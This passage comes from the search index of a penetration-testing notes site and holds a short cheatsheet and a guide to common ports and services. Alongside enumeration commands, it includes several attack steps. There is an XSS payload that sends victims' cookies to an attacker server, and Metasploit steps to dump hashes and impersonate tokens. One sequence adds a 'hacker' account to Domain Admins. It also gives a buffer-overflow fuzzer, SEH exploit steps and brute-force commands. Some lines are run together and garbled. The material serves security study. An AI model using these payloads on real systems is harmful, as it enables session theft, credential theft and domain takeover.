\"file\".  </li> <li><code>tail -15 file</code>: display the last 15 lines of the file \"file\".  </li> <li><code>tail -f file</code>: continuously display the output of the file \"file\" (useful for log files).  </li> <li><code>cat tmp | grep Bcast</code>: pipe the output of \"cat tmp\" to the grep command, searching for \"Bcast\".  </li> <li><code>ps aux</code>: display all running processes for all users.  </li> <li><code>kill -9 PID</code>: forcefully terminate the process with the specified PID.  </li> <li><code>wc -l tmp2</code>: count the number of lines in the file \"tmp2\".  </li> <li><code>cut -d delimiter -f fields</code>: cut fields from lines of a file based on a delimiter.  </li> <li><code>sort -u file</code>: sort the contents of the file \"file\" and remove duplicates.  </li> <li><code>sort -t . -k 1,1n -k 2,2n -k 3,3n -k 4,4n</code>: sort IP addresses correctly.  </li> <li><code>awk '{print $1}' file</code>: display the first column of the file \"file\".  </li> <li><code>awk '{print $1,$5}' file</code>: display the first and fifth columns of the file \"file\".  </li> <li><code>grep -v 'string' file</code>: display lines from the file \"file\" that do not contain the specified string.  </li> <li><code>egrep -v '(string1|string2|string3)' file</code>: display lines from the file \"file\" that do not contain multiple specified strings.  </li> <li><code>sed 's/FOO/BAR/g' file</code>: replace all occurrences of \"FOO\" with \"BAR\" in the file \"file\".  </li> <li><code>sed 's/FOO//g' file</code>: remove all occurrences of \"FOO\" from the file \"file\".  </li> <li><code>sed '/^FOO/d' file</code>: remove lines from the file \"file\" that start with \"FOO\".  </li> <li>Set text color: <code>echo -e \"\\e[1;34m This is a blue text.\\e[0m\"</code> </li> </ul> <p>\u200bBash Scripts</p> <ul> <li>Simple bash script</li> </ul> <pre><code>#!/bin/bash\necho \"Hello world.\" \n</code></pre> <ul> <li>Make a file executable</li> </ul> <pre><code>chmod +x file\nor\nchmod 755 file \n</code></pre> <ul> <li>Variables</li> </ul> <pre><code>name=Bobecho \n$nameuser=$(whoami)\necho $user\necho 'Hello' $name. 'You are running as' $user.\n</code></pre> <ul> <li>IP Address</li> </ul> <pre><code>#!/bin/bash\nclear\necho \"Hello World\"\nname=Bob\nip=$(ifconfig | grep \"Bcast:\" | cut -d\":\" -f2 | cut -d\" \" -f1)\necho \"Hello\" $name \"Your IP address is:\" $ip\n</code></pre> <ul> <li>User Input</li> </ul> <pre><code>#!/bin/bash\necho \"Please input your domain:\"\nread -p \"Domain:\" domain\nping -c 5 $domain\n</code></pre> <ul> <li>Check For No User Input</li> </ul> <pre><code>#!/bin/bash\nif [ -z $domain ]; then\necho \"#########################\"\necho \"Invalid choice.\"\nexit\nfi \n</code></pre> <ul> <li>For loops</li> </ul> <pre><code>#!/bin/bash\nfor host in $(cat hosts.txt)\ndo\ncommand $host\ndone\n</code></pre> <ul> <li>One Liners\u200bPort Scan</li> </ul> <pre><code> for port in $(cat Ports.txt); do nc -nzv ip $port &amp; sleep 0.5; done  \n</code></pre>"},{"location":"Pentesting/Network/cheatsheet-short/#ctf-notes","title":"CTF Notes","text":"<ul> <li>Enumerate Users via Finger</li> <li>Show nfs shares availableshowmount -e ip</li> <li>User nfspysh to mount share and create .ssh directorynfspysh -o server=ip:/home/usermkdir .sshcd .ssh</li> <li>Generate ssh key pair <pre><code>ssh-keygencp id_rsa.pub /tmp/authorized_keys\n</code></pre></li> <li>Transfer attacker public key to host <pre><code>put /tmp/authorized_keysexit\n</code></pre></li> <li>Login to SSH server with no password\u200b\u200b</li> </ul>"},{"location":"Pentesting/Network/cheatsheet-short/#cookie-stealing","title":"Cookie Stealing","text":"<p>\u200b - Start Web Service </p><pre><code>\u200bpython -m SimpleHTTPServer 80\u200b\n</code></pre> - Use one of the following XSS payloads:\u200b <pre><code>&lt;script&gt;\n    document.write('&lt;img src=\"http://your_server.com/steal_cookie.php?cookie=' + document.cookie + '\"&gt;');\n&lt;/script&gt;\n</code></pre>"},{"location":"Pentesting/Network/cheatsheet-short/#domain-admin-exploitation","title":"Domain Admin Exploitation","text":"<p>After compromising a Windows machine:</p> <ul> <li>List the domain administrators: <pre><code>From Shell - net group \"Domain Admins\" /domain\n</code></pre></li> <li>Dump the hashes (Metasploit) <pre><code>msf &gt; run post/windows/gather/smart_hashdump GETSYSTEM=FALSE\n</code></pre></li> <li>Find the admins (Metasploit) <pre><code>spool /tmp/enumdomainusers.txt\nmsf &gt; use auxiliary/scanner/smb/smb_enumusers_domain\nmsf &gt; set smbuser Administrator\nmsf &gt; set smbpass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\nmsf &gt; set rhosts ip/24\nmsf &gt; set threads 8\nmsf &gt; run\n\u200bmsf&gt; spool off\n</code></pre></li> </ul>"},{"location":"Pentesting/Network/cheatsheet-short/#compromise-admins-box","title":"Compromise Admin's box","text":"<pre><code>meterpreter &gt; load incognito\nmeterpreter &gt; list_tokens -u\nmeterpreter &gt; impersonate_token MYDOM\\\\adaministratormeterpreter &gt; getuid\nmeterpreter &gt; shell\n\u200bC:\\&gt; whoamimydom\\adaministrator\nC:\\&gt; net user hacker /add /domain\nC:\\&gt; net group \"Domain Admins\" hacker /add /domain\n</code></pre>"},{"location":"Pentesting/Network/cheatsheet-short/#exploit-development-cheatsheet","title":"Exploit Development Cheatsheet","text":"<p>\u200bFuzzing </p><pre><code>\u200bimport socket\n\u200bbuffer = [\"A\"]\ncounter = 50\u200b\nwhile len(buffer) &lt;= 1000:    \n    buffer.append(\"A\" * counter)    \n    counter = counter + 50 \u200b\nfor buffstring in buffer:    \n    print \"Fuzzing:\" + str(len(buffstring))    \n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    \n    sock.connect( (\"192.168.0.20\", 5555) )    \n    sock.send(buffstring)    \n    sock.close()\n</code></pre> Bad Character <pre><code>Testing:\u200b\"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\"\"\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\"\"\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\"\"\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\"\"\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\"\"\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\"\"\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\"\"\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\"\"\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\"\"\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\"\"\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\"\"\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\"\"\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\"\"\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\"\"\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\"\"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\"\"\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\"\"\\xff\"\u200b\n</code></pre>"},{"location":"Pentesting/Network/cheatsheet-short/#structured-exception-handler-seh-exploitation-notes","title":"Structured Exception Handler (SEH) Exploitation notes","text":"<ul> <li>Crash the application.   </li> <li>Check SEH overwirte (view-seh chain).  </li> <li>Find offset (!mona pattern_create ).  </li> <li>Find certain SEH references to the cyclic pattern (!mona findmsp)- Verify offset to NSEH (Next Exception).  </li> <li>Find POP/POP/RET address with mona (!mona seh -cpb ).  </li> <li>Add short jump into payload to jump ofver SEH (\"\\xeb\\x06\" + 2 bytes of padding).  </li> <li>Add shellcode to the payload.  </li> <li>Ensure existing padding to make sure the crash still happens.  </li> </ul> <p>\u200b</p>"},{"location":"Pentesting/Network/common-ports-and-services/","title":"Common Ports and Services","text":""},{"location":"Pentesting/Network/common-ports-and-services/#common-ports-and-services","title":"Common Ports and Services","text":""},{"location":"Pentesting/Network/common-ports-and-services/#port-xxx-service-unknown","title":"Port XXX - Service unknown","text":"<p>If you have a port open with unkown service you can do this to find out which service it might be.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-21-ftp","title":"Port 21 - FTP","text":"<p>Connect to the ftp-server to enumerate software and version</p> <p>Many ftp-servers allow anonymous users. These might be misconfigured and give too much access, and it might also be necessary for certain exploits to work. So always try to log in with <code>anonymous:anonymous</code>.</p> <p>Remember the binary and ascii mode!</p> <p>If you upload a binary file you have to put the ftp-server in binary mode, otherwise the file will become corrupted and you will not be able to use it! The same for text-files. Use ascii mode for them! You just write binary and ascii to switch mode.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-22-ssh","title":"Port 22 - SSH","text":"<p>SSH is such an old and fundamental technology so most modern version are quite hardened. You can find out the version of the SSH either but scanning it with nmap or by connecting with it using <code>nc</code>.</p> <p>It returnes something like this: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu1</p> <p>This banner is defined in RFC4253, in chapter 4.2 Protocol Version Exchange. http://www.openssh.com/txt/rfc4253.txt The protocol-version string should be defined like this: <code>SSH-protoversion-softwareversion SP comments CR LF</code> Where comments is optional. And SP means space, and CR (carriege return) and LF (Line feed) So basically the comments should be separated by a space.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-23-telnet","title":"Port 23 - Telnet","text":"<p>Telnet is considered insecure mainly because it does not encrypt its traffic. Also a quick search in exploit-db will show that there are various RCE-vulnerabilities on different versions. Might be worth checking out.</p> <ul> <li>Brute force</li> </ul> <p>You can also brute force it like this:</p> <pre><code>hydra -l root -P /root/SecLists/Passwords/10_million_password_list_top_100.txt ip telnet\n</code></pre>"},{"location":"Pentesting/Network/common-ports-and-services/#port-25-smtp","title":"Port 25 - SMTP","text":"<p>SMTP is a server to server service. The user receives or sends emails using IMAP or POP3. Those messages are then routed to the SMTP-server which communicates the email to another server. The SMTP-server has a database with all emails that can receive or send emails. We can use SMTP to query that database for possible email-addresses. Notice that we cannot retrieve any emails from SMTP. We can only send emails.</p> <p>Here are the possible commands:</p> <ul> <li>HELO - EHLO - Extended SMTP.</li> <li>STARTTLS - SMTP communicted over unencrypted protocol. By starting TLS-session we encrypt the traffic.</li> <li>RCPT - Address of the recipient.</li> <li>DATA - Starts the transfer of the message contents.</li> <li>RSET - Used to abort the current email transaction.MAIL - Specifies the email address of the - sender.</li> <li>QUIT - Closes the connection.</li> <li>HELP - Asks for the help screen.</li> <li>AUTH - Used to authenticate the client to the server.</li> <li>VRFY - Asks the server to verify is the email user's mailbox exists.</li> </ul> <p>Manually</p> <p>We can use this service to find out which usernames are in the database. This can be done in the following way.</p> <pre><code>nc ip 25                                                                               \u200b220 metasploitable.localdomain ESMTP Postfix (Ubuntu)VRFY root252 2.0.0 rootVRFY roooooot550 5.1.1 : Recipient address rejected: User unknown in local recipient table\n</code></pre> <p>Here we have managed to identify the user <code>root</code>. But <code>roooooot</code> was rejected.</p> <p><code>VRFY</code>, <code>EXPN</code> and <code>RCPT</code> can be used to identify users.</p> <p>Telnet is a bit more friendly some times. So always use that too</p>"},{"location":"Pentesting/Network/common-ports-and-services/#automatized","title":"Automatized","text":"<p>This process can of course be automatized</p> <ul> <li>Check for commands</li> </ul> <pre><code>nmap -script smtp-commands.nse ip\n</code></pre> <ul> <li>smtp-user-enum</li> </ul> <p>The command will look like this. <code>-M</code> for mode. <code>-U</code> for userlist. <code>-t</code> for target</p> <pre><code>smtp-user-enum -M VRFY -U /root/sectools/SecLists/Usernames/Names/names.txt -t ip\n</code></pre> <pre><code>Mode ..................... VRFYWorker Processes ......... 5Usernames file ........... /root/sectools/SecLists/Usernames/Names/names.txtTarget count ............. 1Username count ........... 8607Target TCP port .......... 25Query timeout ............ 5 secsTarget domain ............ \u200b######## Scan started at Sun Jun 19 11:04:59 2016 #########ip: Bin exists192.168.1.xxx: Irc exists192.168.1.xxx: Mail exists192.168.1.xx: Man exists192.168.1.xxx: Sys exists######## Scxxxn completed at Sun Jun 19 11:06:51 2016 #########5 results.\u200b8607 queries in 112 seconds (76.8 queries / sec)\n</code></pre> <ul> <li>Metasploit</li> </ul> <p>I can also be done using metasploit</p> <pre><code>msf &gt; use auxiliary/scanner/smtp/smtp_enum msf auxiliary(smtp_enum) &gt; show options\u200bModule options (auxiliary/scanner/smtp/smtp_enum):\u200b   Name       Current Setting                                                Required  Description   ----       ---------------                                                --------  -----------   RHOSTS                                                                    yes       The target address range or CIDR identifier   RPORT      25                                                             yes       The target port   THREADS    1                                                              yes       The number of concurrent threads   UNIXONLY   true                                                           yes       Skip Microsoft bannered servers when testing unix users   USER_FILE  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  yes       The file that contains a list of probable users accounts.\n</code></pre> <p>Here are the documentations for SMTP  </p> <ul> <li>https://cr.yp.to/smtp/vrfy.html\u200b  </li> <li> <p>http://null-byte.wonderhowto.com/how-to/hack-like-pro-extract-email-addresses-from-smtp-server-0160814/\u200b</p> </li> <li> <p>\u200bhttp://www.dummies.com/how-to/content/smtp-hacks-and-how-to-guard-against-them.html\u200b</p> </li> <li> <p>\u200bhttp://pentestmonkey.net/tools/user-enumeration/smtp-user-enum\u200b</p> </li> </ul>"},{"location":"Pentesting/Network/common-ports-and-services/#port-53-dns","title":"Port 53 - DNS","text":"<p>DNS is crucial for translating human-readable domain names into IP addresses that computers use to communicate over the internet. Port 53 is specifically designated for DNS queries and responses. It facilitates the exchange of DNS information between DNS clients and servers, enabling domain name resolution and internet navigation. This port is fundamental for the proper functioning of the internet's addressing system, allowing users to access websites, send emails, and perform various online activities.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-69-tftp","title":"Port 69 - TFTP","text":"<p>TFTP stands for Trivial File Transfer Protocol. It's a simple protocol used for transferring files between devices on a network. Unlike FTP, which is more complex and feature-rich, TFTP is lightweight and lacks authentication and directory browsing capabilities. It operates over UDP port 69 and is commonly used for bootstrapping devices, such as routers and network switches, during the initial stages of configuration. TFTP is also utilized in scenarios where a fast and lightweight file transfer protocol is required, albeit with limited security features.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-79-finger","title":"Port 79 - Finger","text":"<p>Finger is a network protocol used to retrieve information about users on a remote system. It operates on TCP port 79 and allows users to query the system for details such as login name, full name, and the last time a user logged in. However, due to security concerns, Finger is often disabled or restricted on modern systems as it can provide attackers with valuable reconnaissance information for potential exploits.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-80-http","title":"Port 80 - HTTP","text":"<p>HTTP (Hypertext Transfer Protocol) communication, the foundation of data communication on the World Wide Web. It's the default port for web browsers to access web pages, allowing them to request and receive web content from web servers. When you type a website URL into your browser, it sends an HTTP request to the server on port 80, which then responds with the requested web page.</p> <p>We usually just think of vulnerabilities on the http-interface, the web page, when we think of port 80. But with <code>.htaccess</code> we are able to password protect certain directories. If that is the case we can brute force that the following way.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#password-protect-directory-with-htaccess","title":"Password protect directory with htaccess","text":"<p>Create a directory that you want to password-protect. Create .htaccess tile inside that directory.</p> <ul> <li>Content of .htaccess:</li> </ul> <pre><code>AuthType BasicAuthName \"Password Protected Area\"AuthUserFile /var/www/html/test/.htpasswdRequire valid-user\n</code></pre> <ul> <li>Create .htpasswd file</li> </ul> <pre><code>htpasswd -cb .htpasswd test admin\nservice apache2 restart\n</code></pre> <p>This will now create a file called .htpasswd with the user: test and the password: admin</p> <p>If the directory does not display a login-prompt, you might have to change the apache2.conf file. To this:</p>"},{"location":"Pentesting/Network/common-ports-and-services/#brute-force-it","title":"Brute force it","text":"<p>Now that we know how this works we can try to brute force it with medusa.</p> <pre><code>medusa -h ip -u admin -P wordlist.txt -M http -m DIR:/test -T 10\n</code></pre>"},{"location":"Pentesting/Network/common-ports-and-services/#port-88-kerberos","title":"Port 88 - Kerberos","text":"<p>Kerberos is a protocol that is used for network authentication. Different versions are used by *nix and Windows. But if you see a machine with port 88 open you can be fairly certain that it is a Windows Domain Controller.</p> <p>If you already have a login to a user of that domain you might be able to escalate that privilege.</p> <p>Check out: MS14-068</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-110-pop3","title":"Port 110 - Pop3","text":"<p>This service is used for fetching emails on a email server. So the server that has this port open is probably an email-server, and other clients on the network (or outside) access this server to fetch their emails.</p> <pre><code>telnet ip 110\nUSER PASS admin\nList all emails: list\nRetrive email number 5, for example: retr 5\n</code></pre>"},{"location":"Pentesting/Network/common-ports-and-services/#port-111-rpcbind","title":"Port 111 - Rpcbind","text":"<p>Rpcbind, is a network service that acts as a mediator for Remote Procedure Call (RPC) requests in Unix-like operating systems. It listens for RPC requests and assigns unique port numbers to RPC services when they register with it. Rpcbind enables clients to locate RPC services dynamically by mapping them to specific port numbers. It plays a crucial role in facilitating communication between client and server applications in networked environments. However, it can also pose security risks if not properly configured, potentially allowing unauthorized access or exploitation of RPC services.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-119-ntp","title":"Port 119 - NTP","text":"<p>Network time protocol. It is used synchronize time. If a machine is running this server it might work as a server for synchronizing time. So other machines query this machine for the exact time.</p> <p>An attacker could use this to change the time. Which might cause denial of service and all around havoc.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-123-ntp","title":"Port 123 - NTP","text":"<p>Network Time Protocol (NTP), a crucial service for synchronizing the time on networked devices. NTP ensures that computers and devices maintain accurate time settings by communicating with designated time servers. This port facilitates the exchange of time synchronization information between client devices and NTP servers, enabling precise coordination of time across networks. It plays a vital role in various applications, including network security, logging, and distributed systems, by ensuring that all devices operate on a standardized and synchronized time basis.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-135-msrpc","title":"Port 135 - MSRPC","text":"<p>This is the windows rpc-port. https://en.wikipedia.org/wiki/Microsoft_RPC\u200b</p> <pre><code>nmap ip --script=msrpc-enum\n</code></pre> <pre><code>msf &gt; use exploit/windows/dcerpc/ms03_026_dcom\n</code></pre> <p>Samba is a service that enables the user to share files with other machines. It has interoperatibility, which means that it can share stuff between linux and windows systems. A windows user will just see an icon for a folder that contains some files. Even though the folder and files really exists on a linux-server.</p> <pre><code>smbclient //ip/tmpsmbclient \\\\\\\\ip\\\\ipc$ -U john smbclient //ip/ipc$ -U john\n</code></pre> <p>If you don't provide any password, just click enter, the server might show you the different shares and version of the server. This can be useful information for looking for exploits. There are tons of exploits for smb.</p> <p>So smb, for a linux-user, is pretty much like and ftp or a nfs.</p> <p>Here is a good guide for how to configure samba: https://help.ubuntu.com/community/How%20to%20Create%20a%20Network%20Share%20Via%20Samba%20Via%20CLI%20(Command-line%20interface/Linux%20Terminal)%20-%20Uncomplicated,%20Simple%20and%20Brief%20Way!\u200b</p> <pre><code>mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 \"//ip/My Share\" /mnt/cifs\n</code></pre> <p>If you have credentials you can use psexec you easily log in. You can either use the standalone binary or the metasploit module.</p> <pre><code>use exploit/windows/smb/psexec\n</code></pre> <p>Scanning for smb with Nmap</p> <p>There are several NSE scripts that can be useful, for example:</p> <pre><code>ls -l /usr/share/nmap/scripts/smb*\n</code></pre> <pre><code>-rw-r--r-- 1 root root  45K Jan 24  2016 /usr/share/nmap/scripts/smb-brute.nse-rw-r--r-- 1 root root 4.8K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-domains.nse-rw-r--r-- 1 root root 5.8K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-groups.nse-rw-r--r-- 1 root root 7.9K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-processes.nse-rw-r--r-- 1 root root  12K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-sessions.nse-rw-r--r-- 1 root root 6.8K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-shares.nse-rw-r--r-- 1 root root  13K Jan 24  2016 /usr/share/nmap/scripts/smb-enum-users.nse-rw-r--r-- 1 root root 1.7K Jan 24  2016 /usr/share/nmap/scripts/smb-flood.nse-rw-r--r-- 1 root root 7.3K Jan 24  2016 /usr/share/nmap/scripts/smb-ls.nse-rw-r--r-- 1 root root 8.6K Jan 24  2016 /usr/share/nmap/scripts/smb-mbenum.nse-rw-r--r-- 1 root root 7.0K Jan 24  2016 /usr/share/nmap/scripts/smb-os-discovery.nse-rw-r--r-- 1 root root 5.0K Jan 24  2016 /usr/share/nmap/scripts/smb-print-text.nse-rw-r--r-- 1 root root  63K Jan 24  2016 /usr/share/nmap/scripts/smb-psexec.nse-rw-r--r-- 1 root root 5.0K Jan 24  2016 /usr/share/nmap/scripts/smb-security-mode.nse-rw-r--r-- 1 root root 2.4K Jan 24  2016 /usr/share/nmap/scripts/smb-server-stats.nse-rw-r--r-- 1 root root  14K Jan 24  2016 /usr/share/nmap/scripts/smb-system-info.nse-rw-r--r-- 1 root root 1.5K Jan 24  2016 /usr/share/nmap/scripts/smbv2-enabled.nse-rw-r--r-- 1 root root 7.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-conficker.nse-rw-r--r-- 1 root root 6.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-cve2009-3103.nse-rw-r--r-- 1 root root 6.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms06-025.nse-rw-r--r-- 1 root root 5.4K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms07-029.nse-rw-r--r-- 1 root root 5.7K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms08-067.nse-rw-r--r-- 1 root root 5.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms10-054.nse-rw-r--r-- 1 root root 7.2K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-ms10-061.nse-rw-r--r-- 1 root root 4.5K Jan 24  2016 /usr/share/nmap/scripts/smb-vuln-regsvc-dos.nse\n</code></pre> <pre><code>nmap -p 139,445 ip/24 --script smb-enum-shares.nse smb-os-discovery.nse\n</code></pre> <p>It can be a bit buggy sometimes so run it several times to make sure it found all users.</p> <p>Enum4linux can be used to enumerate windows and linux machines with smb-shares.</p> <p>The do all option:</p> <p>For info about it ere: https://labs.portcullis.co.uk/tools/enum4linux/\u200b</p> <p>You can also use rpcclient to enumerate the share.</p> <p>Connect with a null-session. That is, without a user. This only works for older windows servers.</p> <p>Once connected you could enter commands like</p> <pre><code>srvinfo\nenumdomusers\ngetdompwinfo\nquerydom\ninfo\nnetshareenum\nnetshareenumall\n</code></pre>"},{"location":"Pentesting/Network/common-ports-and-services/#enumerate","title":"Enumerate","text":""},{"location":"Pentesting/Network/common-ports-and-services/#connecting","title":"Connecting","text":""},{"location":"Pentesting/Network/common-ports-and-services/#connectin-with-psexec","title":"Connectin with PSExec","text":""},{"location":"Pentesting/Network/common-ports-and-services/#scanning-with-nmap","title":"Scanning with nmap","text":""},{"location":"Pentesting/Network/common-ports-and-services/#nbtscan","title":"nbtscan","text":""},{"location":"Pentesting/Network/common-ports-and-services/#enum4linux","title":"Enum4linux","text":""},{"location":"Pentesting/Network/common-ports-and-services/#rpcclient","title":"rpcclient","text":""},{"location":"Pentesting/Network/common-ports-and-services/#port-143993-imap","title":"Port 143/993 - IMAP","text":"<p>IMAP lets you access email stored on that server. So imagine that you are on a network at work, the emails you recieve is not stored on your computer but on a specific mail-server. So every time you look in your inbox your email-client (like outlook) fetches the emails from the mail-server using imap.</p> <p>IMAP is a lot like pop3. But with IMAP you can access your email from various devices. With pop3 you can only access them from one device.</p> <p>Port 993 is the secure port for IMAP.</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-161-and-162-snmp","title":"Port 161 and 162 - SNMP","text":"<p>Simple Network Management Protocol</p> <p>SNMP protocols 1,2 and 2c does not encrypt its traffic. So it can be intercepted to steal credentials.</p> <p>SNMP is used to manage devices on a network. It has some funny terminology. For example, instead of using the word password the word community is used instead. But it is kind of the same thing. A common community-string/password is public.</p> <p>You can have read-only access to the snmp.Often just with the community string <code>public</code>.</p> <p>Common community strings</p> <p>Here is a longer list of common community strings: https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/wordlist-common-snmp-community-strings.txt\u200b</p> <p>SNMP stores all teh data in the Management Information Base. The MIB is a database that is organized as a tree. Different branches contains different information. So one branch can be username information, and another can be processes running. The \"leaf\" or the endpoint is the actual data. If you have read-access to the database you can read through each endpoint in the tree. This can be used with snmpwalk. It walks through the whole database tree and outputs the content.</p> <ul> <li>snmpwalk</li> </ul> <pre><code>snmpwalk -c public -v1 ip #community string and which version\n</code></pre> <p>This command will output a lot of information. Way to much, and most of it will not be relevant to us and much we won't understand really. So it is better to request the info that you are interested in. Here are the locations of the stuff that we are interested in:</p> <pre><code>1.3.6.1.2.1.25.1.6.0 System Processes1.3.6.1.2.1.25.4.2.1.2 Running Programs1.3.6.1.2.1.25.4.2.1.4 Processes Path1.3.6.1.2.1.25.2.3.1.4 Storage Units1.3.6.1.2.1.25.6.3.1.2 Software Name1.3.6.1.4.1.77.1.2.25 User Accounts1.3.6.1.2.1.6.13.1.3 TCP Local Ports\n</code></pre> <p>Now we can use this to query the data we really want.</p> <ul> <li> <p>snmpenum</p> </li> <li> <p>snmp-check</p> </li> </ul> <p>This is a bit easier to use and with a lot prettier output.</p> <pre><code>snmp-check -t ip -c public\n</code></pre> <ul> <li> </li> </ul> <p>Since SNMP is using UDP we have to use the <code>-sU</code> flag.</p> <pre><code>nmap -iL ips.txt -p 161,162 -sU --open -vvv -oG snmp-nmap.txt\n</code></pre> <ul> <li> </li> </ul> <p>With onesixtyone you can test for open ports but also brute force community strings. I have had more success using onesixtyone than using nmap. So better use both.</p> <ul> <li> </li> </ul> <p>There are a few snmp modules in metasploit that you can use. snmp_enum can show you usernames, services, and other stuff.</p> <p>\u200bhttps://www.offensive-security.com/metasploit-unleashed/snmp-scan/\u200b</p>"},{"location":"Pentesting/Network/common-ports-and-services/#mib-management-information-base","title":"MIB - Management information base","text":""},{"location":"Pentesting/Network/common-ports-and-services/#scan-for-open-ports-nmap","title":"Scan for open ports - Nmap","text":""},{"location":"Pentesting/Network/common-ports-and-services/#onesixtyone","title":"Onesixtyone","text":""},{"location":"Pentesting/Network/common-ports-and-services/#metasploit","title":"Metasploit","text":""},{"location":"Pentesting/Network/common-ports-and-services/#port-199-smux","title":"Port 199 - Smux","text":"<p>SNMP multiplexing protocol (SMUX), which facilitates communication between SNMP managers and agents. SMUX allows multiple SNMP (Simple Network Management Protocol) sub-agents to operate concurrently on a single network device. It enables efficient management and monitoring of network devices by centralizing data collection and control through SNMP. </p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-389636-ldap","title":"Port 389/636 - Ldap","text":"<p>Lightweight Directory Access Protocol. This port is usually used for Directories. Directory her means more like a telephone-directory rather than a folder. Ldap directory can be understood a bit like the windows registry. A database-tree. Ldap is sometimes used to store usersinformation. Ldap is used more often in corporate structure. Webapplications can use ldap for authentication. If that is the case it is possible to perform ldap-injections which are similar to sqlinjections.</p> <p>You can sometimes access the ldap using a anonymous login, or with other words no session. This can be useful becasue you might find some valuable data, about users.</p> <pre><code>ldapsearch -h ip -p 389 -x -b \"dc=mywebsite,dc=com\"\n</code></pre> <p>When a client connects to the Ldap directory it can use it to query data, or add or remove.</p> <p>Port 636 is used for SSL.</p> <p>There are also metasploit modules for Windows 2000 SP4 and Windows Xp SP0/SP1</p>"},{"location":"Pentesting/Network/common-ports-and-services/#port-443-https","title":"Port 443 - HTTPS","text":"<p>HTTPS, a secure version of HTTP, the protocol used for web browsing. HTTPS encrypts data exchanged between a user's browser and a website, ensuring confidentiality and integrity. It's commonly used for secure online transactions, login pages, and sensitive data transfer, providing protection against eavesdropping and tampering. Websites using HTTPS have a padlock icon in the browser's address bar, indicating a secure connection. check for SSL-vulnerabilities such as heartbleed. For more on how to exploit web-applications check out the chapter on client-side vulnerabilities.</p> <p>OpenSSL 1.0.1 through 1.0.1f (inclusive) are vulnerable OpenSSL 1.0.1g is NOT vulnerable OpenSSL 1.0.0 branch is NOT vulnerable OpenSSL 0.9.8 branch is NOT vulnerable</p> <p>First we need to investigate if the https-page is vulnerable to heartbleed\u200b</p> <p>We can do that the following way.</p> <p>or using a nmap script</p> <pre><code>nmap -sV --script=ssl-heartbleed ip\n</code></pre> <p>You can exploit the vulnerability in many different ways. There is a module for it in burp suite, and metasploit also has a module for it.</p> <pre><code>use auxiliary/scanner/ssl/openssl_heartbleedset RHOSTS ipset verbose truerun\n</code></pre> <p>Now you have a flow of random data, some of it might be of interest to you.</p> <p>Read the certificate.</p> <ul> <li>Does it include names that might be useful?</li> <li>Correct vhost</li> 